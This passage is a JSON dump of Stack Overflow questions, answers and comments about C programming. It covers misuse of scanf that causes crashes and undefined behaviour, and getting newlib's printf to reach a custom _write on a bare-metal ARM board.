href=\"https://stackoverflow.com/tour\">tour</a>, especially <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a>."}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 0, "creation_date": 1499279144, "post_id": 44933389, "comment_id": 76842800, "body": "change <code>char c[1]</code> to <code>char c</code> and change your <code>scanf</code> argument to <code>&amp;c</code>. There&#39;s no point in declaring an array 1 item long, and <code>scanf</code> wants the address of where to write the input data."}, {"owner": {"reputation": 7050, "user_id": 8033585, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cbcd92ce2da15d74815d79b2908132d3?s=128&d=identicon&r=PG&f=1", "display_name": "AGN Gazer", "link": "https://stackoverflow.com/users/8033585/agn-gazer"}, "reply_to_user": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 0, "creation_date": 1499280980, "post_id": 44933389, "comment_id": 76843808, "body": "@yano <i>&quot;change char c[1] to char c and change your scanf argument to &amp;c. There&#39;s no point in declaring an array 1 item long, and scanf wants the address of where to write the input data.&quot;</i> Then <code>printf(&quot;\\n%c&quot;, c[0]);</code> should be changed to <code>printf(&quot;\\n%c&quot;, c);</code>"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499281391, "post_id": 44933389, "comment_id": 76844049, "body": "&quot;Are there any solution for this?&quot;  --&gt; enable all compiler warnings which would have indicated a problem with <code>scanf(&quot;%c&quot;,c[0]);</code> saving you (and us) time."}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "reply_to_user": {"reputation": 7050, "user_id": 8033585, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cbcd92ce2da15d74815d79b2908132d3?s=128&d=identicon&r=PG&f=1", "display_name": "AGN Gazer", "link": "https://stackoverflow.com/users/8033585/agn-gazer"}, "edited": false, "score": 0, "creation_date": 1499281833, "post_id": 44933389, "comment_id": 76844280, "body": "@AGNGazer yes, other changes would have to be made throughout the remainder of the code (assuming this is an MCVE) .. only intended to kickstart the process with a comment."}], "answers": [{"comments": [{"owner": {"reputation": 7050, "user_id": 8033585, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cbcd92ce2da15d74815d79b2908132d3?s=128&d=identicon&r=PG&f=1", "display_name": "AGN Gazer", "link": "https://stackoverflow.com/users/8033585/agn-gazer"}, "reply_to_user": {"reputation": 7087, "user_id": 1389898, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/00f2a3f2624a47edc48464d4929a7508?s=128&d=identicon&r=PG", "display_name": "dlmeetei", "link": "https://stackoverflow.com/users/1389898/dlmeetei"}, "edited": false, "score": 1, "creation_date": 1499279445, "post_id": 44933484, "comment_id": 76842957, "body": "@dlmeetei You would have been right if <code>c</code> were declared as <code>char c</code> and not as <code>char c[1]</code>"}, {"owner": {"reputation": 7087, "user_id": 1389898, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/00f2a3f2624a47edc48464d4929a7508?s=128&d=identicon&r=PG", "display_name": "dlmeetei", "link": "https://stackoverflow.com/users/1389898/dlmeetei"}, "edited": false, "score": 0, "creation_date": 1499279982, "post_id": 44933484, "comment_id": 76843242, "body": "Agreed, but char c is better char c[1]; So, I thought Arashi need to update that also"}, {"owner": {"user_type": "does_not_exist", "display_name": "user8245293"}, "reply_to_user": {"reputation": 7050, "user_id": 8033585, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cbcd92ce2da15d74815d79b2908132d3?s=128&d=identicon&r=PG&f=1", "display_name": "AGN Gazer", "link": "https://stackoverflow.com/users/8033585/agn-gazer"}, "edited": false, "score": 0, "creation_date": 1499280242, "post_id": 44933484, "comment_id": 76843381, "body": "@AGNGazer yes, but seems some devs pass pointer-of-pointers to <code>scanf</code>!?! . Also I wonder how global <code>char[1]</code> could be NULL(as @dbush stated)!? Since it&#39;s <code>char[1]</code>, not <code>char*</code>. Agree <code>char[1]</code> is non-sense, but just stated the problem."}, {"owner": {"reputation": 7050, "user_id": 8033585, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cbcd92ce2da15d74815d79b2908132d3?s=128&d=identicon&r=PG&f=1", "display_name": "AGN Gazer", "link": "https://stackoverflow.com/users/8033585/agn-gazer"}, "reply_to_user": {"reputation": 7087, "user_id": 1389898, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/00f2a3f2624a47edc48464d4929a7508?s=128&d=identicon&r=PG", "display_name": "dlmeetei", "link": "https://stackoverflow.com/users/1389898/dlmeetei"}, "edited": false, "score": 1, "creation_date": 1499280553, "post_id": 44933484, "comment_id": 76843560, "body": "@dlmeetei Too bad you have deleted your first comment and now it is not clear what I was commenting on in my previous comment. <i>&quot;char c is better char c[1]&quot;</i> - It depends on the needs (in general). For this particular problem replacing <code>char c[1]</code> with <code>char c</code> is neither better nor worse."}, {"owner": {"reputation": 7087, "user_id": 1389898, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/00f2a3f2624a47edc48464d4929a7508?s=128&d=identicon&r=PG", "display_name": "dlmeetei", "link": "https://stackoverflow.com/users/1389898/dlmeetei"}, "edited": false, "score": 0, "creation_date": 1499280682, "post_id": 44933484, "comment_id": 76843623, "body": "One place that I have seen array of size one is at  <code>struct hack</code>. My first comment was something like `scanf(&quot;%c&quot;, &amp;c), not scanf(&quot;%c&quot;, c), sorry"}, {"owner": {"reputation": 7050, "user_id": 8033585, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cbcd92ce2da15d74815d79b2908132d3?s=128&d=identicon&r=PG&f=1", "display_name": "AGN Gazer", "link": "https://stackoverflow.com/users/8033585/agn-gazer"}, "edited": false, "score": 1, "creation_date": 1499280856, "post_id": 44933484, "comment_id": 76843727, "body": "@Arashi dbush probably refers to <a href=\"https://stackoverflow.com/questions/1414215/initial-value-of-int-array-in-c\" title=\"initial value of int array in c\">stackoverflow.com/questions/1414215/&hellip;</a> Because the array is initialized at the global scope, its values are zeros (interpreted as NULL pointer)"}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user8245293"}, "is_accepted": false, "score": 0, "last_activity_date": 1499279170, "creation_date": 1499279170, "answer_id": 44933484, "question_id": 44933389, "link": "https://stackoverflow.com/questions/44933389/how-to-call-scanf-inside-int-mainint-argc-char-argv/44933484#44933484", "title": "How to call scanf inside int main(int argc, char *argv[])", "body": "<p>The <code>scanf(\"%c\",c[0]);</code> should be <code>scanf(\"%c\",c);</code></p>\n"}, {"tags": [], "owner": {"reputation": 7050, "user_id": 8033585, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cbcd92ce2da15d74815d79b2908132d3?s=128&d=identicon&r=PG&f=1", "display_name": "AGN Gazer", "link": "https://stackoverflow.com/users/8033585/agn-gazer"}, "is_accepted": false, "score": -1, "last_activity_date": 1499281206, "last_edit_date": 1499281206, "creation_date": 1499279284, "answer_id": 44933513, "question_id": 44933389, "link": "https://stackoverflow.com/questions/44933389/how-to-call-scanf-inside-int-mainint-argc-char-argv/44933513#44933513", "title": "How to call scanf inside int main(int argc, char *argv[])", "body": "<p>replace</p>\n\n<pre><code>scanf(\"%c\",c[0]);\n</code></pre>\n\n<p>with</p>\n\n<pre><code>scanf(\"%c\",c);\n</code></pre>\n\n<p>Also in your code, sometimes you use <code>c[0]</code> and sometimes <code>*c</code>:</p>\n\n<pre><code>printf(\"\\n%c\", c[0]);\nif(*c == 'O'){\n    printf(\"\\nThe system is open\");\n}\nelse if(*c == 'X'){\n    printf(\"\\nThe system is unopen\");\n}\n</code></pre>\n\n<p>I would suggest to be consistent about this and, e.g., replace:</p>\n\n<pre><code>printf(\"\\n%c\", c[0]);\n</code></pre>\n\n<p>with </p>\n\n<pre><code>printf(\"\\n%c\", *c);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 0, "last_activity_date": 1499279291, "creation_date": 1499279291, "answer_id": 44933515, "question_id": 44933389, "link": "https://stackoverflow.com/questions/44933389/how-to-call-scanf-inside-int-mainint-argc-char-argv/44933515#44933515", "title": "How to call scanf inside int main(int argc, char *argv[])", "body": "<p>The <code>%c</code> format specifier to <code>scanf</code> expects the address of a <code>char</code>.  You're passing in <code>c[0]</code> which is the <em>value</em> of a <code>char</code>.  Since <code>c</code> is global, all of its elements are initialized with the value 0.  This means you're passing in a NULL pointer to <code>scanf</code>, which it then attempts to dereference.  This invokes <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a>.</p>\n\n<p>Change the <code>scanf</code> call to pass in the address of a <code>char</code>.  Also, change <code>c</code> to a single <code>char</code> instead of a single element array:</p>\n\n<pre><code>char c;\n...\nscanf(\"%c\",&amp;c);\nprintf(\"\\n%c\", c);\nif(c == 'O'){\n    printf(\"\\nThe system is open\");\n}\nelse if(c == 'X'){\n    printf(\"\\nThe system is unopen\");\n}\n</code></pre>\n\n<p>There's also no reason you shouldn't be able to define <code>c</code> inside of the <code>main</code> function, as long as the definition comes before any other statements.</p>\n"}], "owner": {"reputation": 1, "user_id": 8122432, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d13ef0e795cc88c795774155fcc6d186?s=128&d=identicon&r=PG&f=1", "display_name": "RamitaTr", "link": "https://stackoverflow.com/users/8122432/ramitatr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 813, "favorite_count": 0, "answer_count": 3, "score": -2, "last_activity_date": 1499281206, "creation_date": 1499278812, "last_edit_date": 1499279054, "question_id": 44933389, "link": "https://stackoverflow.com/questions/44933389/how-to-call-scanf-inside-int-mainint-argc-char-argv", "title": "How to call scanf inside int main(int argc, char *argv[])", "body": "<p>I am trying to modify code from MercuryAPI SDK for RFID reader. The program suppose to work by taking some argument from the use and print some message depend on the user's input. However, the program does not allow me to declare new variable inside the main function.</p>\n\n<pre><code>int main(int argc, char *argv[])\n</code></pre>\n\n<p>So, I tried to declare the variable as a global outside main function.</p>\n\n<pre><code>char c[1];\nint main(int argc, char *argv[])\n{\n    //Code that already written from MercuryAPI SDK\n    printf(\"\\nEnter input: \");\n    scanf(\"%c\",c[0]);\n    printf(\"\\n%c\", c[0]);\n    if(*c == 'O'){\n        printf(\"\\nThe system is open\");\n    }\n    else if(*c == 'X'){\n        printf(\"\\nThe system is unopen\");\n    }\n}\n</code></pre>\n\n<p>The declaration is succeed, but the program terminate write after I input an argument. Are there any solution for this?</p>\n"}, {"tags": ["c", "gcc", "arm", "bare-metal", "newlib"], "comments": [{"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 1, "creation_date": 1499277055, "post_id": 44932748, "comment_id": 76841649, "body": "first and foremost, give up on printf, if you are using this strictly to get printf it is a massive waste.  make a simple binary/octal/hex printer, takes like 10 lines of code..."}, {"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 1, "creation_date": 1499277104, "post_id": 44932748, "comment_id": 76841672, "body": "to get this to work I start by stripping every function in the backend and make them pass.  before it can call printf you are correct it is going to do an istty if not other functions perhaps an fopen.  just let those all return the pass value.  then it will get to write..."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1499277184, "post_id": 44932748, "comment_id": 76841712, "body": "As a sidenote: <code>printf</code> &amp; friends are most likely not a good idea for a bare-metal embedded system. They are too bloated, even more as they are based on the stream-io functions. Additionally many coding guides forbit variable argument lists. Better write specific conversion/output routines for your output link, if you really need them at all."}, {"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 0, "creation_date": 1499277208, "post_id": 44932748, "comment_id": 76841725, "body": "it looks like you have done that.  shouldnt need _sbrk for a printf, so you are doing something else in your program (_sbrk is tied to malloc basically)"}, {"owner": {"reputation": 693, "user_id": 492927, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/139646fbca54ab3a188db0eebf92631c?s=128&d=identicon&r=PG", "display_name": "Sreeyesh", "link": "https://stackoverflow.com/users/492927/sreeyesh"}, "reply_to_user": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 0, "creation_date": 1499277273, "post_id": 44932748, "comment_id": 76841763, "body": "@old_timer all other function are being called so far are returning pass values."}, {"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 1, "creation_date": 1499277288, "post_id": 44932748, "comment_id": 76841770, "body": "flash and sram are separate, have you confirmed that .data is being copied over and/or your format string is a const (.text or .rodata) and not in .data?"}, {"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 0, "creation_date": 1499277378, "post_id": 44932748, "comment_id": 76841813, "body": "there are also 50-100 line printfs you can just use for baremetal that dont have any C library calls or minimal at least, dont support float of course, but are lighter on the overhead.  I prefer just to print hex numbers out with my 20 line function and that is more than adequate (if a blinking led is not enough)."}, {"owner": {"reputation": 693, "user_id": 492927, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/139646fbca54ab3a188db0eebf92631c?s=128&d=identicon&r=PG", "display_name": "Sreeyesh", "link": "https://stackoverflow.com/users/492927/sreeyesh"}, "reply_to_user": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 0, "creation_date": 1499277690, "post_id": 44932748, "comment_id": 76841996, "body": "@old_timer my .date is definitely being copied over. I can show my start-up code. The format string I tried is a simple string contant(Just &quot;Hello world&quot;) which as per y knowledge should go to the .rodata"}, {"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 1, "creation_date": 1499278474, "post_id": 44932748, "comment_id": 76842441, "body": "you can just look to see where it went, I use objdump -D but you could maybe use readelf."}, {"owner": {"reputation": 5867, "user_id": 2252087, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/020cbe41b02f03d59f3adae022c0ce7d?s=128&d=identicon&r=PG", "display_name": "ensc", "link": "https://stackoverflow.com/users/2252087/ensc"}, "edited": false, "score": 4, "creation_date": 1499280017, "post_id": 44932748, "comment_id": 76843265, "body": "do you call <code>fflush(stdout)</code> after <code>printf()</code>?"}, {"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 1, "creation_date": 1499298276, "post_id": 44932748, "comment_id": 76851648, "body": "or put a newline at the end of the format?"}, {"owner": {"reputation": 181, "user_id": 1810130, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec4bac9f277c2936afc89391f5108d7a?s=128&d=identicon&r=PG", "display_name": "Tony K", "link": "https://stackoverflow.com/users/1810130/tony-k"}, "edited": false, "score": 1, "creation_date": 1499335523, "post_id": 44932748, "comment_id": 76866733, "body": "Did you try compiling with the nosys spec? I.e. Passing <code>-specs=nosys.specs</code> to the linker. Otherwise it may link to the default implementation of _write()."}, {"owner": {"reputation": 693, "user_id": 492927, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/139646fbca54ab3a188db0eebf92631c?s=128&d=identicon&r=PG", "display_name": "Sreeyesh", "link": "https://stackoverflow.com/users/492927/sreeyesh"}, "reply_to_user": {"reputation": 5867, "user_id": 2252087, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/020cbe41b02f03d59f3adae022c0ce7d?s=128&d=identicon&r=PG", "display_name": "ensc", "link": "https://stackoverflow.com/users/2252087/ensc"}, "edited": false, "score": 0, "creation_date": 1617481624, "post_id": 44932748, "comment_id": 118318117, "body": "@ensc That really helped. It&#39;s working now. Thank you!"}], "owner": {"reputation": 693, "user_id": 492927, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/139646fbca54ab3a188db0eebf92631c?s=128&d=identicon&r=PG", "display_name": "Sreeyesh", "link": "https://stackoverflow.com/users/492927/sreeyesh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1173, "favorite_count": 1, "answer_count": 0, "score": 3, "last_activity_date": 1557769363, "creation_date": 1499276398, "last_edit_date": 1499277976, "question_id": 44932748, "link": "https://stackoverflow.com/questions/44932748/printf-in-newlib-is-not-working-in-baremetal-arm-environment", "title": "printf in newlib is not working in baremetal ARM environment", "body": "<p>I am working in a bare-metal ARM project in which I am trying to integrate newlib library. As a beginner, I am trying to make the <code>printf</code> function working first so that I can see the standard output through UART. I have already gone through many on-line documents that describes how to get this done. Instead of blindly following the steps, I did everything myself by learning things from those documents. I made many mistakes in the beginning but fixed them one by one and kept the work progressing.\n       But now I have stuck with an issue which no one has ever seems to be experienced so far, according to my internet search. Now let me come to the actual, issue.</p>\n\n<p>The <code>printf</code> function is returning without calling my implementation of <code>_write</code> function. When I debug I can see that the <code>printf</code> is invoking other system calls that I have written myself(Like <code>_isatty</code>, <code>_sbrk</code> and <code>_fstat</code>).</p>\n\n<p>These are the system calls that I have implemented in order to resolve the linking issues(undefined references)</p>\n\n<pre><code>extern char __heap_start__;\nextern char __heap_end__;\n\nvoid _exit(int status)\n{\n    while (1);\n}\nvoid *_sbrk(int incr)\n{\n    static char *heap_end = &amp;__heap_start__;\n    char *base = heap_end;\n    if(heap_end + incr &gt; &amp;__heap_end__)\n    {\n        errno = ENOMEM;\n        return (void *)-1;\n    }\n    heap_end += incr;\n    return base;\n}\nint _write(int fd, char *buff, int size)\n{\n    int i;\n    for(i = 0; i &lt; size; i++)\n    {\n        UART0_write_char(buff[i]);\n    }\n    return i;\n}\nint _read(int fd, char *buff, int size)\n{\n    return 0;\n}\n\nint _open(const char *name, int flags,int mode)\n{\n    return 0;\n}\n\nvoid _close(int fd)\n{\n}\nint _isatty(int fd)\n{\n    return 1;\n}\nint _fstat(int fd, struct stat *st)\n{\n    st-&gt;st_mode = S_IFCHR;\n    return 0;\n}\noff_t _lseek(int fd, off_t offset, int whence)\n{\n    return 0;\n}\n</code></pre>\n\n<p>My linker script</p>\n\n<pre><code>STACK_HEAP_BOUNDARY_OFFSET = 0;\nMEMORY\n{\n    FLASH (rx) : ORIGIN = 0x00000000, LENGTH = 512K\n    SRAM  (rw) : ORIGIN = 0x40000000, LENGTH = 32K\n}\n\nSECTIONS\n{\n    .text :\n    {\n        startup.o (.text)\n        *(.text .txt.*)\n        *(.glue_7)\n        *(.glue_7t)\n        . = ALIGN(4);\n    } &gt; FLASH\n\n    .ARM.extab :\n    {\n        *(.ARM.extab* .gnu.linkonce.armextab.*)\n    } &gt; FLASH\n\n    .ARM :\n    {\n        *(.ARM.exidx*)\n    } &gt;FLASH\n\n    .rodata :\n    {\n        *(.rodata .rodata.*)\n        . = ALIGN(4);\n    } &gt; FLASH\n\n    .data :\n    {\n        __data_load__ = LOADADDR (.data);\n        __data_start__ = .;\n        *(.data .data.*)\n        . = ALIGN(4);\n        __data_end__ = .;\n    } &gt; SRAM AT &gt; FLASH\n\n    .bss :\n    {\n        __bss_start__ = .;\n        *(.bss .bss.*)\n        *(COMMON)\n        . = ALIGN(4);\n        __bss_end__ = .;\n    } &gt; SRAM\n\n    .heap :\n    {\n        __heap_start__ = .;\n        PROVIDE(end = __heap_start__);\n        PROVIDE(_heap_start = __heap_start__);\n        . = . + ((LENGTH(SRAM) - (. - (ORIGIN(SRAM)))) / 2);\n        . += STACK_HEAP_BOUNDARY_OFFSET;\n        . = ALIGN(4);\n        __heap_end__ = .;\n        PROVIDE(_heap_end = __heap_end__);\n    } &gt; SRAM\n\n    .stack :\n    {\n        __stack_start__ = .;\n        . = . + (LENGTH(SRAM) - (. - (ORIGIN(SRAM))));\n        . = ALIGN(4);\n        __stack_end__ = .;\n        __stack_size__ = __stack_end__ - __stack_start__;\n        __IRQ_stack_top__ = (__stack_start__ + (__stack_size__ / 2));\n    } &gt; SRAM\n}\n</code></pre>\n\n<p>My Makefile</p>\n\n<pre><code>TOOLCHAIN_PREFIX:=arm-none-eabi-\nCC := $(TOOLCHAIN_PREFIX)gcc\nLD := $(TOOLCHAIN_PREFIX)ld\nAS := $(TOOLCHAIN_PREFIX)as\nAR := $(TOOLCHAIN_PREFIX)ar -cr\nOBJCOPY := $(TOOLCHAIN_PREFIX)objcopy\n\nRM := rm -f\n\nTARGET := image.hex\n\nOBJS := startup.o $(patsubst %.c,%.o,$(wildcard *.c))\n\nCFLAGS := -mcpu=arm7tdmi-s -g3 -Wall -I. -gdwarf-2\nAS_FLAGS := -mcpu=arm7tdmi-s -g3 -gdwarf-2\n\nLD_FLAGS := -Wl,-Map,$(TARGET:%.hex=%).map -nostartfiles\n\nLD_SCRIPT := lpc2138.ld\n\nall :   $(TARGET)\n\n$(TARGET) : $(TARGET:%.hex=%.elf)\n    $(OBJCOPY) -O ihex $&lt; $@\n\n$(TARGET:%.hex=%.elf) : $(OBJS)\n    $(CC) -o $@ -T $(LD_SCRIPT) $(OBJS) $(LD_FLAGS)\n\nstartup.o : startup.s\n    $(AS) $(AS_FLAGS) -o $@ $&lt;\n\n%.o : %.c\n    $(CC) -c $(CFLAGS) -o $@ $&lt;\n\nclean :\n    $(RM) $(TARGET) $(TARGET:%.hex=%.elf) $(TARGET:%.hex=%).map *.o\n</code></pre>\n\n<p>Please let me know if any further information is needed from my side. Thank you in advance</p>\n\n<p>EDIT:</p>\n\n<p>Start-up code</p>\n\n<pre><code>/* Standard definitions of Mode bits and Interrupt (I &amp; F) flags in PSRs */\nMode_USR    =   0x10\nMode_FIQ    =   0x11\nMode_IRQ    =   0x12\nMode_SVC    =   0x13\nMode_ABT    =   0x17\nMode_UND    =   0x1B\nMode_SYS    =   0x1F\n\nI_Bit       =   0x80    /* when I bit is set, IRQ is disabled */\nF_Bit       =   0x40    /* when F bit is set, FIQ is disabled */\n\n    .text\n    .arm\n    .global _start\n    .func   _start\n_start:\n    B   _reset              /* Reset vector */\n    B   _loop               /* Undefined Instruction */\n    B   _loop               /* Software Interrupt */\n    B   _loop               /* Prefetch Abort */\n    B   _loop               /* Data Abort */\n    NOP                     /* Reserved */\n    LDR pc, [pc, #-0x0FF0]  /* VicVectAddr */\n    /* LDR pc, _fiq_addr */\n    B   _loop               /* FIQ Handler */\n_reset:\n/* Enable FIQ and IRQ */\n    MSR CPSR_c,#(Mode_IRQ | I_Bit | F_Bit)\n    LDR SP, =__IRQ_stack_top__\n    MSR CPSR_c,#Mode_SVC\n\n/* Relocate the .data section (copy from ROM to RAM) */\n    LDR r0,=__data_load__\n    LDR r1,=__data_start__\n    LDR r2,=__data_end__\n_l1:\n    CMP r1,r2\n    LDMLTIA r0!,{r3}\n    STMLTIA r1!,{r3}\n    BLT _l1\n\n    /* Clear the .bss section (zero init) */\n    LDR r1,=__bss_start__\n    LDR r2,=__bss_end__\n    MOV r3,#0\n_l2:\n    CMP r1,r2\n    STMLTIA r1!,{r3}\n    BLT _l2\n\n    LDR sp,=__stack_end__\n    LDR FP,=__stack_end__\n    LDR r0,=main\n    MOV lr,pc\n    BX  r0\n_loop:\n    B   _loop\n\n/* _fiq_addr:\n    .word VIC_FIQ_handler\n*/\n    .endfunc\n    .end\n</code></pre>\n"}, {"tags": ["c", "dev-c++"], "comments": [{"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 6, "creation_date": 1499275737, "post_id": 44932522, "comment_id": 76840932, "body": "<code>scanf(&quot;%s&quot;,&amp;op);</code> -&gt; <code>op</code> is a single <code>char</code>, yet you are trying to read in a string -&gt; <i>undefined behavior</i>"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1499275750, "post_id": 44932522, "comment_id": 76840937, "body": "Anyway - <code>scanf(&quot;%s&quot;,&amp;op)</code> is UB, as <code>op</code> is <code>char</code>. Both snippets are broken."}, {"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1499276339, "post_id": 44932522, "comment_id": 76841254, "body": "replace %s--&gt;%c"}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1499276428, "post_id": 44932522, "comment_id": 76841309, "body": "This is a nice example why this is called &quot;Undefined Behavior&quot; instead of error or crash or anything else. Environmental (and thus random) context influences how the program behaves. As you saw, this may range from &quot;seems to behave correctly&quot; (one extreme) to crash (the other extreme). In between is something even more terrible: &quot;behaves most times correctly&quot; (sporadic errors which usually apprear on customer side but never in your debugger). The reason was already pointed out twice: the wrong usage of <code>scanf()</code> which is unfortunately (usually) not detected by the C compiler."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499283321, "post_id": 44932522, "comment_id": 76845169, "body": "<code>scanf(&quot;%s&quot;,&amp;op);</code> -&gt; <code>scanf(&quot; %s&quot;,&amp;op);</code>. Note the space before <code>%c</code>."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499362763, "post_id": 44932522, "comment_id": 76886683, "body": "regarding: <code>scanf(&quot;%s&quot;,&amp;op);</code> this will always cause a buffer overflow (undefined behavior) because %s always appends a NUL byte to the buffer. suggest using: <code>scanf(&quot;%c&quot;,&amp;op);</code>   And always check the returned value (not the parameter values) to assure the operation was successful  I.E. <code>if( 1 != scanf(&quot;%c&quot;,&amp;op) ) { handle error }</code>"}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": 